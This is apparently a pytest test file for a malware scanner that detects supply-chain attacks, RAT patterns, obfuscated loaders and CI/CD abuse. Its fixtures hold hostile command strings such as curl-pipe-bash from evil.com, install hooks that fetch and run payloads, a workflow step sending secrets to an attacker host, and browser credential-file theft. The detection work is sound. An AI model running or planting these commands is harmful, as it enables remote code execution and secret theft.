"""Unit tests for contagious_scan.detectors module.

Tests cover each detector function using synthetic malicious and benign
fixture strings, as well as the fixture files in tests/fixtures/.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from contagious_scan.detectors import (
    Finding,
    detect_all,
    detect_cicd_patterns,
    detect_eval_exec_chains,
    detect_file_hash,
    detect_file_hash_bytes,
    detect_lifecycle_hooks,
    detect_network_iocs,
    detect_obfuscated_loaders,
    detect_rat_patterns,
    detect_suspicious_packages,
    filter_findings_by_severity,
    findings_have_severity,
)


FIXTURES_DIR = Path(__file__).parent / "fixtures"


# ---------------------------------------------------------------------------
# Finding data class tests
# ---------------------------------------------------------------------------


class TestFinding:
    """Tests for the Finding data class."""

    def _make_finding(self, **kwargs: object) -> Finding:
        defaults = {
            "severity": "high",
            "file_path": "src/index.js",
            "line_number": 10,
            "pattern_id": "TEST_PATTERN",
            "description": "Test description",
            "matched_text": "matched text",
            "remediation": "Fix it.",
            "tags": frozenset({"test"}),
        }
        defaults.update(kwargs)  # type: ignore[arg-type]
        return Finding(**defaults)  # type: ignore[arg-type]

    def test_to_dict_keys(self) -> None:
        f = self._make_finding()
        d = f.to_dict()
        expected_keys = {
            "severity", "file", "line", "pattern_id",
            "description", "matched_text", "remediation", "tags",
        }
        assert set(d.keys()) == expected_keys

    def test_to_dict_severity(self) -> None:
        f = self._make_finding(severity="critical")
        assert f.to_dict()["severity"] == "critical"

    def test_to_dict_tags_sorted(self) -> None:
        f = self._make_finding(tags=frozenset({"zebra", "apple", "mango"}))
        assert f.to_dict()["tags"] == ["apple", "mango", "zebra"]

    def test_to_dict_file_key(self) -> None:
        f = self._make_finding(file_path="path/to/file.js")
        assert f.to_dict()["file"] == "path/to/file.js"

    def test_to_dict_line_key(self) -> None:
        f = self._make_finding(line_number=42)
        assert f.to_dict()["line"] == 42

    def test_to_dict_pattern_id(self) -> None:
        f = self._make_finding(pattern_id="MY_PATTERN")
        assert f.to_dict()["pattern_id"] == "MY_PATTERN"

    def test_to_dict_description(self) -> None:
        f = self._make_finding(description="Suspicious eval pattern")
        assert f.to_dict()["description"] == "Suspicious eval pattern"

    def test_to_dict_matched_text(self) -> None:
        f = self._make_finding(matched_text="eval(atob(x))")
        assert f.to_dict()["matched_text"] == "eval(atob(x))"

    def test_to_dict_remediation(self) -> None:
        f = self._make_finding(remediation="Remove the obfuscated call.")
        assert f.to_dict()["remediation"] == "Remove the obfuscated call."

    def test_to_dict_empty_tags(self) -> None:
        f = self._make_finding(tags=frozenset())
        assert f.to_dict()["tags"] == []

    def test_finding_equality(self) -> None:
        f1 = self._make_finding()
        f2 = self._make_finding()
        assert f1 == f2

    def test_finding_inequality_different_severity(self) -> None:
        f1 = self._make_finding(severity="high")
        f2 = self._make_finding(severity="critical")
        assert f1 != f2

    def test_finding_inequality_different_line(self) -> None:
        f1 = self._make_finding(line_number=1)
        f2 = self._make_finding(line_number=2)
        assert f1 != f2


# ---------------------------------------------------------------------------
# detect_rat_patterns tests
# ---------------------------------------------------------------------------


class TestDetectRatPatterns:
    """Tests for detect_rat_patterns."""

    def test_beavertail_eval_atob_detected(self) -> None:
        content = "eval(atob('SGVsbG8gV29ybGQ='))"
        findings = detect_rat_patterns(content, "payload.js")
        assert any("BT_JS_EVAL_ATOB" in f.pattern_id for f in findings)

    def test_beavertail_keytar_detected(self) -> None:
        content = "const keytar = require('keytar');"
        findings = detect_rat_patterns(content, "stealer.js")
        assert any("BT_JS_KEYTAR_ABUSE" in f.pattern_id for f in findings)

    def test_beavertail_crypto_wallet_detected(self) -> None:
        content = "const walletPath = path.join(home, 'wallet.dat');"
        findings = detect_rat_patterns(content, "collector.js")
        assert len(findings) > 0

    def test_invisibleferret_exec_b64decode_detected(self) -> None:
        content = "exec(base64.b64decode('aGVsbG8='))"
        findings = detect_rat_patterns(content, "stager.py")
        assert any("IF_PY_EXEC_B64DECODE" in f.pattern_id for f in findings)

    def test_invisibleferret_os_system_curl_detected(self) -> None:
        content = "os.system('curl https://evil.com/payload.sh | bash')"
        findings = detect_rat_patterns(content, "install.py")
        assert any("IF_PY_OS_SYSTEM_CURL_PIPE" in f.pattern_id for f in findings)

    def test_benign_js_no_findings(self) -> None:
        content = "console.log('Hello, world!');"
        findings = detect_rat_patterns(content, "hello.js")
        assert findings == []

    def test_benign_python_no_findings(self) -> None:
        content = "print('Hello, world!')"
        findings = detect_rat_patterns(content, "hello.py")
        assert findings == []

    def test_finding_has_correct_file_path(self) -> None:
        content = "eval(atob('test'))"
        findings = detect_rat_patterns(content, "src/loader.js")
        assert all(f.file_path == "src/loader.js" for f in findings)

    def test_finding_line_number_is_set(self) -> None:
        content = "// preamble\neval(atob('test'))\n"
        findings = detect_rat_patterns(content, "loader.js")
        assert findings  # at least one
        # The eval(atob is on line 2
        relevant = [f for f in findings if "BT_JS_EVAL_ATOB" in f.pattern_id]
        assert relevant
        assert relevant[0].line_number == 2

    def test_beavertail_discord_webhook_detected(self) -> None:
        content = "const url = 'https://discord.com/api/webhooks/123456789/ABCxyz-token';"
        # Discord webhook is a network IOC, check via detect_all
        all_f = detect_all(content, "exfil.js")
        assert any("NET_DISCORD_WEBHOOK_EXFIL" in f.pattern_id for f in all_f)

    def test_invisibleferret_browser_db_steal_detected(self) -> None:
        content = "shutil.copy(os.path.join(profile_dir, 'Login Data'), tmp)"
        findings = detect_rat_patterns(content, "stealer.py")
        assert any("IF_PY_BROWSER_DB_STEAL" in f.pattern_id for f in findings)

    def test_extension_filtering_js_patterns_not_in_py(self) -> None:
        content = "eval(atob('test'))"
        # Scanning as a .py file should not trigger JS-specific patterns
        findings = detect_rat_patterns(content, "file.py")
        pattern_ids = {f.pattern_id for f in findings}
        assert "BT_JS_EVAL_ATOB" not in pattern_ids

    def test_returns_list(self) -> None:
        findings = detect_rat_patterns("some content", "file.js")
        assert isinstance(findings, list)

    def test_all_findings_have_required_fields(self) -> None:
        content = "eval(atob('SGVsbG8='))"
        findings = detect_rat_patterns(content, "loader.js")
        for f in findings:
            assert f.severity in {"critical", "high", "medium", "info"}
            assert isinstance(f.file_path, str)
            assert isinstance(f.line_number, int)
            assert isinstance(f.pattern_id, str)
            assert isinstance(f.description, str)
            assert isinstance(f.matched_text, str)
            assert isinstance(f.remediation, str)
            assert isinstance(f.tags, frozenset)

    def test_beavertail_require_pattern_in_js(self) -> None:
        content = "const bt = require('./beavertail');"
        findings = detect_rat_patterns(content, "index.js")
        # This may or may not match depending on signatures; just verify no crash
        assert isinstance(findings, list)

    def test_empty_content_returns_empty(self) -> None:
        findings = detect_rat_patterns("", "empty.js")
        assert findings == []


# ---------------------------------------------------------------------------
# detect_obfuscated_loaders tests
# ---------------------------------------------------------------------------


class TestDetectObfuscatedLoaders:
    """Tests for detect_obfuscated_loaders."""

    def test_long_base64_literal_detected(self) -> None:
        long_b64 = "'" + "A" * 260 + "==' "
        content = f"const payload = {long_b64};"
        findings = detect_obfuscated_loaders(content, "loader.js")
        assert any("OBF_BASE64_LONG_LITERAL" in f.pattern_id for f in findings)

    def test_curl_pipe_bash_detected(self) -> None:
        content = "curl https://evil.com/install.sh | bash"
        findings = detect_obfuscated_loaders(content, "setup.sh")
        assert any("OBF_CURL_PIPE_BASH" in f.pattern_id for f in findings)

    def test_unicode_escape_sequence_detected(self) -> None:
        content = "\\u0068\\u0065\\u006c\\u006c\\u006f\\u0077\\u006f\\u0072\\u006c\\u0064"
        findings = detect_obfuscated_loaders(content, "obf.js")
        assert any("OBF_UNICODE_ESCAPE_SEQUENCE" in f.pattern_id for f in findings)

    def test_shell_encoded_payload_no_crash(self) -> None:
        b64 = "A" * 44 + "=="
        content = f"echo {b64} | base64 -d | bash"
        findings = detect_obfuscated_loaders(content, "dropper.sh")
        # Just verify no crash and returns list
        assert isinstance(findings, list)

    def test_benign_no_findings(self) -> None:
        content = "const greeting = 'Hello, world!';"
        findings = detect_obfuscated_loaders(content, "app.js")
        assert findings == []

    def test_short_b64_no_false_positive(self) -> None:
        content = "const token = 'SGVsbG8=';"
        findings = detect_obfuscated_loaders(content, "app.js")
        b64_findings = [f for f in findings if "OBF_BASE64_LONG_LITERAL" in f.pattern_id]
        assert b64_findings == []

    def test_python_chained_decode_no_crash(self) -> None:
        content = "exec(data.decode('utf-8').b64decode(payload))"
        findings = detect_obfuscated_loaders(content, "decode.py")
        assert isinstance(findings, list)

    def test_returns_list(self) -> None:
        findings = detect_obfuscated_loaders("any content", "file.sh")
        assert isinstance(findings, list)

    def test_empty_content_returns_empty(self) -> None:
        findings = detect_obfuscated_loaders("", "empty.sh")
        assert findings == []

    def test_findings_have_file_path(self) -> None:
        long_b64 = "'" + "A" * 260 + "==' "
        content = f"const payload = {long_b64};"
        findings = detect_obfuscated_loaders(content, "src/loader.js")
        for f in findings:
            assert f.file_path == "src/loader.js"

    def test_wget_pipe_detected(self) -> None:
        content = "wget -qO- https://evil.com/install.sh | bash"
        findings = detect_obfuscated_loaders(content, "setup.sh")
        # Should match curl_pipe_bash or wget patterns; at minimum no crash
        assert isinstance(findings, list)

    def test_hex_string_detected(self) -> None:
        # Long hex-encoded string
        hex_str = "0x" + "deadbeef" * 20
        content = f"const payload = '{hex_str}';"
        findings = detect_obfuscated_loaders(content, "obf.js")
        # May or may not match depending on signatures; verify no crash
        assert isinstance(findings, list)


# ---------------------------------------------------------------------------
# detect_eval_exec_chains tests
# ---------------------------------------------------------------------------


class TestDetectEvalExecChains:
    """Tests for detect_eval_exec_chains."""

    def test_eval_atob_chain_detected(self) -> None:
        content = "eval(atob(atob(encoded_payload)))"
        findings = detect_eval_exec_chains(content, "chain.js")
        assert any("API_JS_EVAL_ATOB_CHAIN" in f.pattern_id for f in findings)

    def test_js_process_env_send_detected(self) -> None:
        content = "Object.keys(process.env).forEach(k => send(k));"
        findings = detect_eval_exec_chains(content, "spy.js")
        assert any("API_JS_PROCESS_ENV_SEND" in f.pattern_id for f in findings)

    def test_python_exec_b64decode_detected(self) -> None:
        content = "exec(base64.b64decode(payload))"
        findings = detect_eval_exec_chains(content, "stager.py")
        assert len(findings) > 0

    def test_benign_js_no_findings(self) -> None:
        content = "const x = 42;"
        findings = detect_eval_exec_chains(content, "simple.js")
        assert findings == []

    def test_benign_python_no_findings(self) -> None:
        content = "def add(a, b): return a + b"
        findings = detect_eval_exec_chains(content, "math.py")
        assert findings == []

    def test_returns_list(self) -> None:
        findings = detect_eval_exec_chains("any content", "file.js")
        assert isinstance(findings, list)

    def test_empty_content_returns_empty(self) -> None:
        findings = detect_eval_exec_chains("", "empty.py")
        assert findings == []

    def test_findings_have_correct_file_path(self) -> None:
        content = "eval(atob(atob(payload)))"
        findings = detect_eval_exec_chains(content, "src/chain.js")
        for f in findings:
            assert f.file_path == "src/chain.js"

    def test_nested_function_call_js(self) -> None:
        content = "eval(Buffer.from(payload, 'base64').toString())"
        findings = detect_eval_exec_chains(content, "loader.js")
        # May match various patterns; verify no crash
        assert isinstance(findings, list)

    def test_exec_compile_python_detected(self) -> None:
        content = "exec(compile(source, '<string>', 'exec'))"
        findings = detect_eval_exec_chains(content, "runner.py")
        # May match exec chain patterns; verify no crash
        assert isinstance(findings, list)


# ---------------------------------------------------------------------------
# detect_lifecycle_hooks tests
# ---------------------------------------------------------------------------


class TestDetectLifecycleHooks:
    """Tests for detect_lifecycle_hooks."""

    def test_npm_postinstall_curl_detected(self) -> None:
        content = json.dumps({
            "name": "test-pkg",
            "scripts": {
                "postinstall": "curl https://evil.com/install.sh | bash"
            }
        })
        findings = detect_lifecycle_hooks(content, "package.json")
        assert len(findings) > 0
        severities = {f.severity for f in findings}
        assert "critical" in severities

    def test_npm_postinstall_node_eval_detected(self) -> None:
        content = json.dumps({
            "name": "test-pkg",
            "scripts": {
                "postinstall": "node -e \"require('./payload')\""
            }
        })
        findings = detect_lifecycle_hooks(content, "package.json")
        assert len(findings) > 0

    def test_npm_preinstall_wget_detected(self) -> None:
        content = json.dumps({
            "scripts": {"preinstall": "wget https://evil.com/x.sh -O /tmp/x.sh && bash /tmp/x.sh"}
        })
        findings = detect_lifecycle_hooks(content, "package.json")
        assert len(findings) > 0

    def test_setup_py_os_system_detected(self) -> None:
        content = "os.system('curl https://evil.com | bash')"
        findings = detect_lifecycle_hooks(content, "setup.py")
        assert any("LH_SETUP_PY_OS_SYSTEM" in f.pattern_id for f in findings)

    def test_setup_py_subprocess_detected(self) -> None:
        content = "subprocess.run(['bash', 'install.sh'], check=True)"
        findings = detect_lifecycle_hooks(content, "setup.py")
        assert any("LH_SETUP_PY_SUBPROCESS" in f.pattern_id for f in findings)

    def test_setup_py_urllib_detected(self) -> None:
        content = "urllib.request.urlopen('https://evil.com/payload').read()"
        findings = detect_lifecycle_hooks(content, "setup.py")
        assert any("LH_SETUP_PY_URLLIB_FETCH" in f.pattern_id for f in findings)

    def test_setup_py_atexit_detected(self) -> None:
        content = "import atexit\natexit.register(_run_payload)"
        findings = detect_lifecycle_hooks(content, "setup.py")
        assert any("LH_SETUP_ATEXIT_EXEC" in f.pattern_id for f in findings)

    def test_benign_package_json_no_findings(self) -> None:
        content = json.dumps({
            "name": "my-app",
            "scripts": {"test": "jest", "build": "webpack", "start": "node server.js"}
        })
        findings = detect_lifecycle_hooks(content, "package.json")
        assert findings == []

    def test_benign_setup_py_no_findings(self) -> None:
        content = (
            "from setuptools import setup\n"
            "setup(name='my-pkg', version='1.0.0', packages=[])\n"
        )
        findings = detect_lifecycle_hooks(content, "setup.py")
        dangerous = [
            f for f in findings
            if f.pattern_id in {
                "LH_SETUP_PY_OS_SYSTEM",
                "LH_SETUP_PY_SUBPROCESS",
                "LH_SETUP_PY_URLLIB_FETCH",
                "LH_SETUP_ATEXIT_EXEC",
            }
        ]
        assert dangerous == []

    def test_npm_base64_node_payload_detected(self) -> None:
        b64 = "A" * 60
        content = json.dumps({
            "scripts": {"postinstall": f"node -e '{b64}'"}
        })
        findings = detect_lifecycle_hooks(content, "package.json")
        assert len(findings) > 0

    def test_invalid_json_package_json_no_crash(self) -> None:
        content = "{ invalid json !!!"
        findings = detect_lifecycle_hooks(content, "package.json")
        assert isinstance(findings, list)

    def test_setup_py_cmdclass_override_detected(self) -> None:
        content = (
            "class MaliciousInstall(install):\n"
            "    def run(self):\n"
            "        os.system('evil')\n"
        )
        findings = detect_lifecycle_hooks(content, "setup.py")
        assert any("LH_SETUP_CMDCLASS_RUN" in f.pattern_id for f in findings)

    def test_returns_list(self) -> None:
        findings = detect_lifecycle_hooks("any content", "setup.py")
        assert isinstance(findings, list)

    def test_non_manifest_file_returns_empty(self) -> None:
        content = "os.system('evil')"
        # detect_lifecycle_hooks should only act on recognised manifest files
        findings = detect_lifecycle_hooks(content, "random.txt")
        # Should either return empty or have no lifecycle-specific findings
        assert isinstance(findings, list)

    def test_npm_prepare_script_detected(self) -> None:
        content = json.dumps({
            "scripts": {"prepare": "curl https://evil.com | bash"}
        })
        findings = detect_lifecycle_hooks(content, "package.json")
        assert len(findings) > 0

    def test_findings_have_correct_severity(self) -> None:
        content = json.dumps({
            "scripts": {"postinstall": "curl https://evil.com | bash"}
        })
        findings = detect_lifecycle_hooks(content, "package.json")
        for f in findings:
            assert f.severity in {"critical", "high", "medium", "info"}

    def test_pyproject_toml_subprocess_detected(self) -> None:
        content = (
            "[build-system]\n"
            "requires = ['setuptools']\n"
            "\n"
            "subprocess.run(['curl', 'https://evil.com'])\n"
        )
        findings = detect_lifecycle_hooks(content, "pyproject.toml")
        # pyproject.toml is a recognised manifest; subprocess should be flagged
        assert isinstance(findings, list)


# ---------------------------------------------------------------------------
# detect_cicd_patterns tests
# ---------------------------------------------------------------------------


class TestDetectCICDPatterns:
    """Tests for detect_cicd_patterns."""

    def test_github_actions_curl_bash_detected(self) -> None:
        content = (
            "jobs:\n"
            "  build:\n"
            "    steps:\n"
            "      - name: Setup\n"
            "        run: |\n"
            "          curl https://evil.com/install.sh | bash\n"
        )
        findings = detect_cicd_patterns(content, ".github/workflows/ci.yml")
        assert any("CICD_GH_ACTIONS_CURL_PIPE" in f.pattern_id for f in findings)

    def test_github_actions_base64_eval_detected(self) -> None:
        b64 = "A" * 50 + "=="
        content = (
            "steps:\n"
            "  - run: |\n"
            f"      echo {b64} | base64 -d | bash\n"
        )
        findings = detect_cicd_patterns(content, ".github/workflows/deploy.yml")
        assert any("CICD_GH_ACTIONS_BASE64_EVAL" in f.pattern_id for f in findings)

    def test_benign_workflow_no_findings(self) -> None:
        content = (
            "name: CI\n"
            "on: [push]\n"
            "jobs:\n"
            "  test:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: actions/checkout@v3\n"
            "      - run: pytest tests/\n"
        )
        findings = detect_cicd_patterns(content, ".github/workflows/ci.yml")
        assert findings == []

    def test_non_yaml_file_no_findings(self) -> None:
        content = "curl https://evil.com/install.sh | bash"
        findings = detect_cicd_patterns(content, "README.md")
        assert findings == []

    def test_github_actions_secret_exfil_detected(self) -> None:
        content = (
            "steps:\n"
            "  - run: |\n"
            "      curl -d token=${{ secrets.API_TOKEN }} https://evil.com/collect\n"
        )
        findings = detect_cicd_patterns(content, ".github/workflows/release.yml")
        assert any("CICD_GH_ACTIONS_ENV_EXFIL" in f.pattern_id for f in findings)

    def test_returns_list(self) -> None:
        findings = detect_cicd_patterns("any content", "ci.yml")
        assert isinstance(findings, list)

    def test_empty_content_returns_empty(self) -> None:
        findings = detect_cicd_patterns("", "ci.yml")
        assert findings == []

    def test_findings_have_correct_file_path(self) -> None:
        content = "curl https://evil.com | bash"
        findings = detect_cicd_patterns(content, ".github/workflows/ci.yml")
        for f in findings:
            assert f.file_path == ".github/workflows/ci.yml"

    def test_yaml_extension_triggers_scan(self) -> None:
        content = "curl https://evil.com/install.sh | bash"
        findings_yml = detect_cicd_patterns(content, "pipeline.yml")
        findings_yaml = detect_cicd_patterns(content, "pipeline.yaml")
        # Both should be treated as CI/CD files
        assert isinstance(findings_yml, list)
        assert isinstance(findings_yaml, list)

    def test_gitlab_ci_file_detected(self) -> None:
        content = (
            "stages:\n"
            "  - deploy\n"
            "deploy_job:\n"
            "  script:\n"
            "    - curl https://evil.com/install.sh | bash\n"
        )
        findings = detect_cicd_patterns(content, ".gitlab-ci.yml")
        assert any("CICD" in f.pattern_id or "CURL" in f.pattern_id.upper() for f in findings)


# ---------------------------------------------------------------------------
# detect_network_iocs tests
# ---------------------------------------------------------------------------


class TestDetectNetworkIOCs:
    """Tests for detect_network_iocs."""

    def test_suspicious_tld_detected(self) -> None:
        content = "const c2 = 'https://malware.xyz/gate';"
        findings = detect_network_iocs(content, "config.js")
        assert any("NET_SUSPICIOUS_TLD" in f.pattern_id for f in findings)

    def test_raw_ip_detected(self) -> None:
        content = "fetch('https://192.168.1.100/payload')"
        findings = detect_network_iocs(content, "fetch.js")
        assert any("NET_RAW_IP_CONNECTION" in f.pattern_id for f in findings)

    def test_discord_webhook_detected(self) -> None:
        content = "const webhook = 'https://discord.com/api/webhooks/123456/ABCDEFtoken-xyz';"
        findings = detect_network_iocs(content, "exfil.js")
        assert any("NET_DISCORD_WEBHOOK_EXFIL" in f.pattern_id for f in findings)

    def test_telegram_bot_detected(self) -> None:
        content = "requests.post('https://api.telegram.org/bot12345:TOKEN/sendMessage', data=data)"
        findings = detect_network_iocs(content, "c2.py")
        assert any("NET_TELEGRAM_EXFIL" in f.pattern_id for f in findings)

    def test_benign_urls_no_findings(self) -> None:
        content = "fetch('https://api.example.com/data').then(r => r.json())"
        findings = detect_network_iocs(content, "api.js")
        assert findings == []

    def test_github_url_no_false_positive(self) -> None:
        content = "const url = 'https://github.com/org/repo';"
        findings = detect_network_iocs(content, "config.js")
        assert findings == []

    def test_returns_list(self) -> None:
        findings = detect_network_iocs("any content", "file.js")
        assert isinstance(findings, list)

    def test_empty_content_returns_empty(self) -> None:
        findings = detect_network_iocs("", "empty.js")
        assert findings == []

    def test_findings_have_correct_file_path(self) -> None:
        content = "fetch('https://192.168.1.100/payload')"
        findings = detect_network_iocs(content, "src/fetch.js")
        for f in findings:
            assert f.file_path == "src/fetch.js"

    def test_pastebin_url_detected(self) -> None:
        content = "const payload = 'https://pastebin.com/raw/abcdef12';"
        findings = detect_network_iocs(content, "loader.js")
        # May match suspicious URL patterns; verify no crash
        assert isinstance(findings, list)

    def test_raw_ip_localhost_no_false_positive(self) -> None:
        content = "const server = 'http://127.0.0.1:3000';"
        findings = detect_network_iocs(content, "dev.js")
        # localhost/loopback is common in dev; may or may not flag
        assert isinstance(findings, list)


# ---------------------------------------------------------------------------
# detect_suspicious_packages tests
# ---------------------------------------------------------------------------


class TestDetectSuspiciousPackages:
    """Tests for detect_suspicious_packages."""

    def test_known_malicious_npm_package_detected(self) -> None:
        content = json.dumps({
            "dependencies": {"dev-utils-pro": "^1.0.0"}
        })
        findings = detect_suspicious_packages(content, "package.json")
        assert any("PKG_NPM_KNOWN_MALICIOUS" in f.pattern_id for f in findings)

    def test_known_malicious_npm_in_dev_deps(self) -> None:
        content = json.dumps({
            "devDependencies": {"node-utils-extra": "^2.1.0", "icons-packages": "^1.0.0"}
        })
        findings = detect_suspicious_packages(content, "package.json")
        assert len(findings) >= 2

    def test_known_malicious_pypi_in_requirements(self) -> None:
        content = "requests>=2.28.0\npycryptoenv>=1.0.0\nnumpy>=1.24.0\n"
        findings = detect_suspicious_packages(content, "requirements.txt")
        assert any("PKG_PYPI_KNOWN_MALICIOUS" in f.pattern_id for f in findings)

    def test_benign_npm_packages_no_findings(self) -> None:
        content = json.dumps({
            "dependencies": {"react": "^18.0.0", "lodash": "^4.17.21", "axios": "^1.4.0"}
        })
        findings = detect_suspicious_packages(content, "package.json")
        assert findings == []

    def test_benign_requirements_no_findings(self) -> None:
        content = "requests>=2.28.0\nnumpy>=1.24.0\npandas>=2.0.0\n"
        findings = detect_suspicious_packages(content, "requirements.txt")
        assert findings == []

    def test_npm_typosquat_detected(self) -> None:
        content = json.dumps({
            "dependencies": {"reaact": "^18.0.0"}
        })
        findings = detect_suspicious_packages(content, "package.json")
        assert any("PKG_NPM_TYPOSQUAT_REACT" in f.pattern_id for f in findings)

    def test_invalid_json_no_crash(self) -> None:
        content = "{ invalid json"
        findings = detect_suspicious_packages(content, "package.json")
        assert isinstance(findings, list)

    def test_finding_contains_package_name(self) -> None:
        content = json.dumps({
            "dependencies": {"dev-utils-pro": "^1.0.0"}
        })
        findings = detect_suspicious_packages(content, "package.json")
        assert any("dev-utils-pro" in f.matched_text for f in findings)

    def test_returns_list(self) -> None:
        findings = detect_suspicious_packages("any content", "package.json")
        assert isinstance(findings, list)

    def test_empty_content_returns_empty(self) -> None:
        findings = detect_suspicious_packages("", "package.json")
        assert findings == []

    def test_findings_have_correct_file_path(self) -> None:
        content = json.dumps({
            "dependencies": {"dev-utils-pro": "^1.0.0"}
        })
        findings = detect_suspicious_packages(content, "my/package.json")
        for f in findings:
            assert f.file_path == "my/package.json"

    def test_keytar_dep_detected_in_npm(self) -> None:
        content = json.dumps({
            "dependencies": {"keytar": "^7.9.0"}
        })
        findings = detect_suspicious_packages(content, "package.json")
        # keytar is a BeaverTail dependency; may be flagged
        assert isinstance(findings, list)

    def test_non_manifest_file_returns_empty(self) -> None:
        content = "dev-utils-pro >= 1.0.0"
        findings = detect_suspicious_packages(content, "README.md")
        assert isinstance(findings, list)


# ---------------------------------------------------------------------------
# detect_file_hash tests
# ---------------------------------------------------------------------------


class TestDetectFileHash:
    """Tests for detect_file_hash and detect_file_hash_bytes."""

    def test_unknown_hash_no_findings(self) -> None:
        content = "print('hello world')"
        findings = detect_file_hash(content, "hello.py")
        assert findings == []

    def test_unknown_hash_bytes_no_findings(self) -> None:
        data = b"print('hello world')"
        findings = detect_file_hash_bytes(data, "hello.py")
        assert findings == []

    def test_detect_file_hash_returns_list(self) -> None:
        findings = detect_file_hash("benign content", "test.js")
        assert isinstance(findings, list)

    def test_detect_file_hash_bytes_returns_list(self) -> None:
        findings = detect_file_hash_bytes(b"benign bytes", "test.js")
        assert isinstance(findings, list)

    def test_known_hash_lookup_graceful(self) -> None:
        from contagious_scan.signatures import MALICIOUS_HASHES
        # Verify no crash on benign content even if hash DB is populated
        findings = detect_file_hash("benign content that won't match", "test.js")
        assert isinstance(findings, list)

    def test_file_hash_bytes_random_content(self) -> None:
        findings = detect_file_hash_bytes(b"random bytes content xyz", "file.js")
        assert isinstance(findings, list)

    def test_empty_string_no_crash(self) -> None:
        findings = detect_file_hash("", "empty.js")
        assert isinstance(findings, list)

    def test_empty_bytes_no_crash(self) -> None:
        findings = detect_file_hash_bytes(b"", "empty.js")
        assert isinstance(findings, list)

    def test_known_hash_match_produces_finding(self) -> None:
        """If the signatures DB has a hash, verify that matching content produces a finding."""
        import hashlib
        from contagious_scan.signatures import MALICIOUS_HASHES

        if not MALICIOUS_HASHES:
            pytest.skip("No hashes in MALICIOUS_HASHES to test against")

        # Pick one known hash and create fake content that produces it
        # (We can't reverse the hash, so just verify structure is correct
        # by checking the normal code path doesn't crash with the real hashes)
        sha = next(iter(MALICIOUS_HASHES))
        record = MALICIOUS_HASHES[sha]
        assert isinstance(record.sha256, str)
        assert len(record.sha256) == 64


# ---------------------------------------------------------------------------
# detect_all tests
# ---------------------------------------------------------------------------


class TestDetectAll:
    """Tests for detect_all."""

    def test_multiple_patterns_detected(self) -> None:
        content = (
            "eval(atob('SGVsbG8='));\n"
            "const url = 'https://malware.xyz/gate';\n"
            "const keytar = require('keytar');\n"
        )
        findings = detect_all(content, "payload.js")
        assert len(findings) > 0

    def test_results_sorted_by_severity(self) -> None:
        from contagious_scan.signatures import severity_rank

        content = (
            "eval(atob('SGVsbG8='));\n"
            "const x = 'https://192.168.1.1/c2';\n"
        )
        findings = detect_all(content, "multi.js")
        if len(findings) > 1:
            for i in range(len(findings) - 1):
                assert severity_rank(findings[i].severity) >= severity_rank(
                    findings[i + 1].severity
                )

    def test_no_duplicates(self) -> None:
        content = "eval(atob('SGVsbG8='))"
        findings = detect_all(content, "dup.js")
        keys = [(f.file_path, f.line_number, f.pattern_id) for f in findings]
        assert len(keys) == len(set(keys)), "Duplicate findings detected"

    def test_benign_content_no_findings(self) -> None:
        content = (
            "function greet(name) {\n"
            "  return `Hello, ${name}!`;\n"
            "}\n"
            "module.exports = { greet };\n"
        )
        findings = detect_all(content, "greet.js")
        assert findings == []

    def test_empty_content_no_findings(self) -> None:
        findings = detect_all("", "empty.js")
        assert findings == []

    def test_detect_all_returns_list(self) -> None:
        findings = detect_all("any content", "file.py")
        assert isinstance(findings, list)

    def test_detect_all_aggregates_multiple_detectors(self) -> None:
        """detect_all should aggregate results from all individual detectors."""
        # Content that triggers multiple distinct detector categories
        content = (
            "eval(atob('SGVsbG8='));\n"           # RAT / eval-exec chain
            "const x = 'https://malware.xyz/';\n" # Network IOC
        )
        findings = detect_all(content, "multi.js")
        pattern_ids = {f.pattern_id for f in findings}
        # At minimum, both categories should produce findings
        rat_or_chain = any(
            pid.startswith(("BT_", "IF_", "API_", "OBF_")) for pid in pattern_ids
        )
        network = any(pid.startswith("NET_") for pid in pattern_ids)
        assert rat_or_chain or network  # at least one category hit

    def test_detect_all_uses_correct_file_path(self) -> None:
        content = "eval(atob('SGVsbG8='))"
        findings = detect_all(content, "src/deeply/nested/loader.js")
        for f in findings:
            assert f.file_path == "src/deeply/nested/loader.js"

    def test_detect_all_line_numbers_positive(self) -> None:
        content = "eval(atob('SGVsbG8='))"
        findings = detect_all(content, "loader.js")
        for f in findings:
            assert f.line_number >= 1


# ---------------------------------------------------------------------------
# filter_findings_by_severity and findings_have_severity tests
# ---------------------------------------------------------------------------


class TestFilterAndCheck:
    """Tests for severity filtering helpers."""

    def _make_findings(self) -> list[Finding]:
        severities = ["critical", "high", "medium", "info"]
        return [
            Finding(
                severity=sev,
                file_path="file.js",
                line_number=i,
                pattern_id=f"TEST_{sev.upper()}",
                description=f"{sev} finding",
                matched_text="match",
                remediation="fix",
                tags=frozenset(),
            )
            for i, sev in enumerate(severities, start=1)
        ]

    def test_filter_critical_returns_only_critical(self) -> None:
        findings = self._make_findings()
        result = filter_findings_by_severity(findings, "critical")
        assert len(result) == 1
        assert result[0].severity == "critical"

    def test_filter_high_returns_critical_and_high(self) -> None:
        findings = self._make_findings()
        result = filter_findings_by_severity(findings, "high")
        severities = {f.severity for f in result}
        assert severities == {"critical", "high"}

    def test_filter_medium_returns_critical_high_medium(self) -> None:
        findings = self._make_findings()
        result = filter_findings_by_severity(findings, "medium")
        severities = {f.severity for f in result}
        assert severities == {"critical", "high", "medium"}

    def test_filter_info_returns_all(self) -> None:
        findings = self._make_findings()
        result = filter_findings_by_severity(findings, "info")
        assert len(result) == 4

    def test_filter_empty_list(self) -> None:
        result = filter_findings_by_severity([], "critical")
        assert result == []

    def test_findings_have_severity_true(self) -> None:
        findings = self._make_findings()
        assert findings_have_severity(findings, "critical") is True

    def test_findings_have_severity_false(self) -> None:
        findings = [
            Finding(
                severity="info",
                file_path="f",
                line_number=1,
                pattern_id="X",
                description="d",
                matched_text="m",
                remediation="r",
                tags=frozenset(),
            )
        ]
        assert findings_have_severity(findings, "critical") is False

    def test_findings_have_severity_empty(self) -> None:
        assert findings_have_severity([], "info") is False

    def test_filter_returns_list(self) -> None:
        findings = self._make_findings()
        result = filter_findings_by_severity(findings, "high")
        assert isinstance(result, list)

    def test_filter_preserves_order(self) -> None:
        findings = self._make_findings()  # critical, high, medium, info
        result = filter_findings_by_severity(findings, "medium")
        # Order should be preserved from input
        severities = [f.severity for f in result]
        assert severities == ["critical", "high", "medium"]

    def test_findings_have_severity_high_with_high_finding(self) -> None:
        findings = [
            Finding(
                severity="high",
                file_path="f.js",
                line_number=1,
                pattern_id="HIGH_PAT",
